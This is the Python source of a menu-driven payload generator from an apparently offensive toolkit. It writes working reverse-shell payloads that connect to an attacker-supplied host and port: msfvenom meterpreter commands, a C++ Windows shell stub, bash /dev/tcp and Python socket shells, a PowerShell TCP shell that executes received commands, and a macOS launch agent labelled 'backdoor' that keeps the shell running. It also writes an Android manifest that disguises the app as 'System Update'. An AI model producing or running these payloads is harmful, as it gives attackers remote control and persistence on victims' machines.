#!/usr/bin/env python3
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

@auth_required
def run_payload():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║      MULTI-PLATFORM PAYLOAD GENERATOR                 ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] Android APK")
    print("[2] Windows EXE")
    print("[3] Linux ELF")
    print("[4] macOS APP")
    print("[5] iOS IPA")
    print("[6] Python Universal")
    print("[7] Bash Reverse Shell")
    print("[8] PowerShell Empire")
    choice = input("\n[PAYLOAD] Select: ").strip()
    lhost = input("[PAYLOAD] LHOST: ").strip()
    lport = input("[PAYLOAD] LPORT: ").strip() or "4444"
    if choice == "1":
        print("[PAYLOAD] msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -o pixxie_android.apk")
        manifest_lines = [
            '<?xml version="1.0" encoding="utf-8"?>',
            '<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.pixxie.backdoor">',
            '<uses-permission android:name="android.permission.INTERNET"/>',
            '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
            '<application android:label="System Update"><activity android:name=".MainActivity">',
            '<intent-filter><action android:name="android.intent.action.MAIN"/>',
            '<category android:name="android.intent.category.LAUNCHER"/></intent-filter></activity></application></manifest>'
        ]
        with open("android_manifest.xml", "w") as f:
            f.write("\n".join(manifest_lines))
        print("[PAYLOAD] Android manifest saved.")
        log_action("PAYLOAD", "Android " + lhost + ":" + lport)
    elif choice == "2":
        print("[PAYLOAD] msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o pixxie_windows.exe")
        cpp_lines = [
            '#include <winsock2.h>',
            '#include <windows.h>',
            '#pragma comment(lib, "ws2_32.lib")',
            'int WINAPI WinMain(HINSTANCE h,HINSTANCE p,LPSTR c,int n){',
            'WSADATA w;WSAStartup(MAKEWORD(2,2),&w);SOCKET s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);',
            'sockaddr_in a;a.sin_family=AF_INET;a.sin_port=htons(' + lport + ');inet_pton(AF_INET,"' + lhost + '",&a.sin_addr);',
            'connect(s,(sockaddr*)&a,sizeof(a));STARTUPINFO si;PROCESS_INFORMATION pi;',
            'ZeroMemory(&si,sizeof(si));si.cb=sizeof(si);si.dwFlags=STARTF_USESTDHANDLES;',
            'si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;',
            'CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);return 0;}'
        ]
        with open("windows_payload.cpp", "w") as f:
            f.write("\n".join(cpp_lines))
        print("[PAYLOAD] Windows C++ stub saved.")
        log_action("PAYLOAD", "Windows " + lhost + ":" + lport)
    elif choice == "3":
        bash_lines = [
            '#!/bin/bash',
            'bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1'
        ]
        with open("linux_payload.sh", "w") as f:
            f.write("\n".join(bash_lines))
        os.chmod("linux_payload.sh", 0o755)
        print("[PAYLOAD] Linux payload saved.")
        log_action("PAYLOAD", "Linux " + lhost + ":" + lport)
    elif choice == "4":
        plist_lines = [
            '<?xml version="1.0" encoding="UTF-8"?>',
            '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">',
            '<plist version="1.0"><dict>',
            '<key>Label</key><string>com.pixxie.backdoor</string>',
            '<key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string>',
            '<string>bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1</string></array>',
            '<key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>'
        ]
        with open("com.pixxie.backdoor.plist", "w") as f:
            f.write("\n".join(plist_lines))
        print("[PAYLOAD] macOS plist saved.")
        log_action("PAYLOAD", "macOS " + lhost + ":" + lport)
    elif choice == "5":
        print("[PAYLOAD] iOS requires jailbreak. Build with Theos.")
        log_action("PAYLOAD", "iOS " + lhost + ":" + lport)
    elif choice == "6":
        py_lines = [
            "import socket,subprocess,os",
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
            "s.connect((" + repr(lhost) + "," + lport + "))",
            "os.dup2(s.fileno(),0)",
            "os.dup2(s.fileno(),1)",
            "os.dup2(s.fileno(),2)",
            "p=subprocess.call(['/bin/sh','-i'])"
        ]
        with open("universal_payload.py", "w") as f:
            f.write("\n".join(py_lines))
        print("[PAYLOAD] Python universal saved.")
        log_action("PAYLOAD", "Python " + lhost + ":" + lport)
    elif choice == "7":
        print("[PAYLOAD] bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1")
        log_action("PAYLOAD", "Bash " + lhost + ":" + lport)
    elif choice == "8":
        ps = "$client=New-Object System.Net.Sockets.TCPClient(" + repr(lhost) + "," + lport + ");"
        ps += "$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};"
        ps += "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){"
        ps += "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        ps += "$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
        ps += "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
        ps += "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close()"
        with open("empire_payload.ps1", "w") as f:
            f.write(ps)
        print("[PAYLOAD] PowerShell Empire saved.")
        log_action("PAYLOAD", "PowerShell " + lhost + ":" + lport)
